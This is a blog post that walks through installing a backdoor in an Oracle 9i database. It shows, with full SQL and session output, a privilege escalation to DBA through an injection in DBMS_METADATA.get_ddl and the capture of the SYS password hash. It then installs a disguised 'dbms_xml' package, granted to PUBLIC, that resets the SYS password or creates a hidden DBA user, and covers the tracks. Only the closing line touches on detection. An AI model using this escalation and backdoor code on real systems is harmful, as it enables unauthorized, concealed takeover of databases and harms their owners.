--- 
wordpress_id: 28
layout: post
title: Installing a Back Door in Oracle 9i
wordpress_url: http://posulliv.com/?p=28
---
In this post, we will demonstrate a way an attacker could install a back door in a 9i Oracle database. The information on this post is based on information obtained from <a href="http://www.petefinnigan.com/">Pete Finnigin's website</a> and the <a href="http://www.2600.com/">2600 magazine</a>. The version of the database we are using in this post is:

<span style="font-size: 85%; font-family: courier new;">sys@ORA9R2&gt; select * from v$version;
BANNER
----------------------------------------------------------------
Oracle9i Enterprise Edition Release 9.2.0.4.0
PL/SQL Release 9.2.0.4.0 - Production
CORE 9.2.0.3.0 Production
TNS for Linux: Version 9.2.0.4.0 - Production
NLSRTL Version 9.2.0.4.0 - Production</span>

<span style="font-size:130%;"><span style="font-weight: bold;">Creating the User
<span style="font-size:100%;"><span style="font-weight: bold;">
</span></span></span><span style="font-size:100%;"><span style="font-family: georgia;">In this example, we will create a user that we will install the back door with. We will presume that either an attacker has already gained access to this account or that a legitimate user wishes to install a back door in our database (the so called inside threat). The user we will install the back door as is testUser. <span style="font-family: georgia;">We will only grant</span></span><span style="font-family: georgia;"> </span><span style="font-family: courier new;">CONNECT</span><span style="font-family: georgia;"> and </span><span style="font-family: courier new;">RESOURCE</span><span style="font-family: georgia;"> to this user.</span></span></span>

<span style="font-size: 85%; font-family: courier new;">sys@ORA9R2&gt; create user testUser identified by testUser;</span>

User created.

sys@ORA9R2&gt; grant connect, resource to testUser;

Grant succeeded.

sys@ORA9R2&gt; connect testUser/testUser
Connected.
testuser@ORA9R2&gt; select * from user_role_privs;

USERNAME GRANTED_ROLE ADM DEF OS_
-------- ------------ --- --- ---
TESTUSER CONNECT      NO  YES NO
TESTUSER RESOURCE     NO  YES NO

testuser@ORA9R2&gt;

<span style="font-size:130%;"><span style="font-weight: bold;">Gaining DBA Privileges</span></span>

<span style="font-size:130%;"><span style="font-size:100%;">Now we will use a known exploit in the 9i version of Oracle that will allow this user to obtain the DBA role. This exploit is described in the document 'Many Ways to Become DBA' by <a href="http://www.petefinnigan.com/">Pete Finnigan</a>. This exploit invloves creating a function and then exploiting a known vulnerability in the DBMS_METADATA package.</span></span>

<span style="font-size:85%;"><span style="font-family: courier new;">testuser@ORA9R2&gt; create or replace function testuser.hack return varchar2</span>
<span style="font-family: courier new;">2 authid current_user is</span>
<span style="font-family: courier new;">3 pragma autonomous_transaction;</span>
<span style="font-family: courier new;">4 begin</span>
<span style="font-family: courier new;">5 execute immediate 'grant dba to testUser';</span>
<span style="font-family: courier new;">6 return '';</span>
<span style="font-family: courier new;">7 end;</span>
<span style="font-family: courier new;">8 /</span></span>

<span style="font-family: courier new;">Function created.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; select sys.dbms_metadata.get_ddl('''||testuser.hack()||''','')</span>
<span style="font-family: courier new;"> 2 from dual;</span>
<span style="font-family: courier new;">ERROR:</span>
<span style="font-family: courier new;">ORA-31600: invalid input value '||testuser.hack()||' for parameter OBJECT_TYPE in</span>
<span style="font-family: courier new;">function GET_DDL</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_SYS_ERROR", line 105</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA_INT", line 1536</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA_INT", line 1900</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA_INT", line 3606</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA", line 504</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA", line 560</span>
<span style="font-family: courier new;">ORA-06512: at "SYS.DBMS_METADATA", line 1221</span>
<span style="font-family: courier new;">ORA-06512: at line 1</span>

<span style="font-family: courier new;">no rows selected</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; select * from user_role_privs;</span>

<span style="font-family: courier new;">USERNAME GRANTED_ROLE ADM DEF OS_</span>
<span style="font-family: courier new;">-------- ------------ --- --- ---</span>
<span style="font-family: courier new;">TESTUSER CONNECT      NO  YES NO</span>
<span style="font-family: courier new;">TESTUSER DBA          NO  YES NO</span>
<span style="font-family: courier new;">TESTUSER RESOURCE     NO  YES NO</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt;</span>

As you can see from the output above, the attacker has now gained the DBA role. Now, the attacker can start working on installing the back door.

<span style="font-size:130%;"><span style="font-weight: bold;">Creating and Installing the Back Door
</span></span><span style="font-size:130%;"><span style="font-size:100%;">
Now, he/she can save what the encrypted form of the SYS user's password is before installing the back door.</span></span>

<span style="font-size: 85%; font-family: courier new;">testuser@ORA9R2&gt; select username, password
2 from dba_users
3 where username = ‘SYS’ ;</span>

USERNAME PASSWORD
-------- ------------------------------
SYS      43CA255A7916ECFE

testuser@ORA9R2&gt;<span style="font-size:130%;"><span style="font-weight: bold;"><span style="font-size:100%;"></span></span></span>

<span style="font-weight: bold;"></span><span style="font-size:130%;"><span style="font-size:100%;">Now, the attacker wants to install the back door as the SYS user so he/she alters the password of the SYS user so they can connect as the SYS user. The attacker will then change this password back to the saved password once finished installing the back door.</span></span>

<span style="font-size: 85%; font-family: courier new;">testuser@ORA9R2&gt; alter user sys identified by pass;
User altered.
testuser@ORA9R2&gt; connect sys/pass as sysdba
Connected.
testuser@ORA9R2&gt;</span>

Now the attacker is connected as the SYS user and starts on creating the back door. The attacker creates the back door like so:

<span style="font-size:85%;"><span style="font-family: courier new;">testuser@ORA9R2&gt; CREATE OR REPLACE PACKAGE dbms_xml AS</span>
<span style="font-family: courier new;">2 PROCEDURE parse (string IN VARCHAR2);</span>
<span style="font-family: courier new;">3 END dbms_xml;</span>
<span style="font-family: courier new;">4 /</span>
<span style="font-family: courier new;">Package created.</span>
<span style="font-family: courier new;">testuser@ORA9R2&gt;</span>
<span style="font-family: courier new;">CREATE OR REPLACE PACKAGE BODY dbms_xml AS</span>
<span style="font-family: courier new;">PROCEDURE parse (string IN VARCHAR2) IS</span>
<span style="font-family: courier new;">var1 VARCHAR2 (100);</span>
<span style="font-family: courier new;">BEGIN</span>
<span style="font-family: courier new;">IF string = 'unlock' THEN</span>
<span style="font-family: courier new;">SELECT PASSWORD INTO var1 FROM dba_users WHERE username = 'SYS';</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'create table syspa1 (col1 varchar2(100))';</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'insert into syspa1 values ('''||var1||''')';</span>
<span style="font-family: courier new;">COMMIT;</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY padraig';</span>
<span style="font-family: courier new;">END IF;</span>
<span style="font-family: courier new;">IF string = 'lock' THEN</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'SELECT col1 FROM syspa1 WHERE ROWNUM=1' INTO var1;</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'ALTER USER SYS IDENTIFIED BY VALUES '''||var1||'''';</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'DROP TABLE syspa1';</span>
<span style="font-family: courier new;">END IF;</span>
<span style="font-family: courier new;">IF string = 'make' THEN</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'CREATE USER hill IDENTIFIED BY padraig';</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'GRANT DBA TO hill';</span>
<span style="font-family: courier new;">END IF;</span>
<span style="font-family: courier new;">IF string = 'unmake' THEN</span>
<span style="font-family: courier new;">EXECUTE IMMEDIATE 'DROP USER hill CASCADE';</span>
<span style="font-family: courier new;">END IF;</span>
<span style="font-family: courier new;">END;</span>
<span style="font-family: courier new;">END dbms_xml;</span>
<span style="font-family: courier new;">/</span></span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; CREATE PUBLIC SYNONYM dbms_xml FOR dbms_xml;</span>

<span style="font-family: courier new;">Synonym created.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; GRANT EXECUTE ON dbms_xml TO PUBLIC;</span>

<span style="font-family: courier new;">Grant succeeded.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt;</span>

This package does the following (examples will be shown below):
<ul>
	<li>It can unlock the SYS account by changing the password to a known password (in this case 'padraig').</li>
	<li>Then, it can revert the SYS account's password back to the original password.</li>
	<li>It can create a new user account with a known password that has the DBA role which can later be dropped from the database.</li>
</ul>
The attacker has now created a back door that can be very difficult to discover. The attacker has chosen a name for the package that looks like it was installed with the Oracle database. Now, the attacker changes the SYS user’s password back to its original value to prevent the DBA from noticing that the SYS account has been hijacked. The attacker will also revoke the DBA role from his/her user account to prevent detection. This role is no longer need by the attacker since he/her has installed the back door.

<span style="font-size:85%;"><span style="font-family: courier new;">testuser@ORA9R2&gt; alter user sys identified by values '43CA255A7916ECFE';</span></span>

<span style="font-family: courier new;">User altered.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; revoke dba from testUser;</span>

<span style="font-family: courier new;">Revoke succeeded.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; disconnect</span>
<span style="font-family: courier new;">Disconnected from Oracle9i Enterprise Edition Release 9.2.0.4.0 - Production</span>
<span style="font-family: courier new;">With the Partitioning, OLAP and Oracle Data Mining options</span>
<span style="font-family: courier new;">JServer Release 9.2.0.4.0 - Production</span>
<span style="font-family: courier new;">testuser@ORA9R2&gt; connect testUser/testUser</span>
<span style="font-family: courier new;">Connected.</span>
<span style="font-family: courier new;">testuser@ORA9R2&gt; select * from user_role_privs;</span>

<span style="font-family: courier new;">USERNAME GRANTED_ROLE ADM DEF OS_</span>
<span style="font-family: courier new;">-------- ------------ --- --- ---</span>
<span style="font-family: courier new;">TESTUSER CONNECT      NO YES NO</span>
<span style="font-family: courier new;">TESTUSER RESOURCE     NO YES NO</span>

<span style="font-size: 100%; font-family: georgia;">In this first example, the attacker is going to use his/her back door to unlock the SYS account and connect as the SYS user.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; execute dbms_xml.parse('unlock');</span>

<span style="font-family: courier new;">PL/SQL procedure successfully completed.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt; connect sys/padraig as sysdba</span>
<span style="font-family: courier new;">Connected.</span>
<span style="font-family: courier new;">testuser@ORA9R2&gt; show user</span>
<span style="font-family: courier new;">USER is "SYS"</span>
<span style="font-family: courier new;">testuser@ORA9R2&gt;</span>

Now, the attacker is finished doing his/her work as the SYS user and will change the SYS password back to the original password by calling the back door again:
<span style="font-size:85%;">
<span style="font-family: courier new;">testuser@ORA9R2&gt; execute dbms_xml.parse('lock');</span></span>

<span style="font-family: courier new;">PL/SQL procedure successfully completed.</span>

<span style="font-family: courier new;">testuser@ORA9R2&gt;</span>

<span style="font-size:130%;"><span style="font-weight: bold;">Conclusion</span></span>

This post showed how an attacker could exploit a known vulnerability in Oracle 9i to obtain DBA privileges and install a back door in an Oracle database. Of course, a wary DBA could detect this by auditing the <span style="font-size:85%;"><span style="font-family: courier new;">ALTER USER</span></span> statement and checking <span style="font-size: 85%; font-family: courier new;">SYS</span> owned objects periodically.
